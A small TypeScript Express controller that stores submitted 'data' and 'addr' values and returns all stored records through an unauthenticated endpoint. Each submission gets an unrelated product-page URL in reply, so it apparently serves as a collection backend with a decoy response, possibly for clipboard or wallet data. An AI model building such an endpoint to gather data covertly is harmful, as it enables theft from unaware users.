import Clip from "../models/clip";

class Controller {
  constructor() {}

  static async get(req: any, res: any) {
    try {
      const data = await Clip.find({});
      return res.json(data);
    } catch (err) {
      return res.json({ error: err });
    }
  }

  static async add(req: any, res: any) {
    const { data, addr } = req.body;
    try {
      const duplicate = await Clip.findOne({ data, addr });
      if (duplicate) return res.json({ charactor_url: "Already exists" });
    } catch (err) {
      return res.json({ charactor_url: "error encountered" });
    }

    try {
      await Clip.create({ data, addr, time: new Date() });
    } catch (err) {
      console.log(err);
    }

    return res.json({
      charactor_url: "https://www.reallusion.com/iclone/game/",
    });
  }
}

export default Controller;
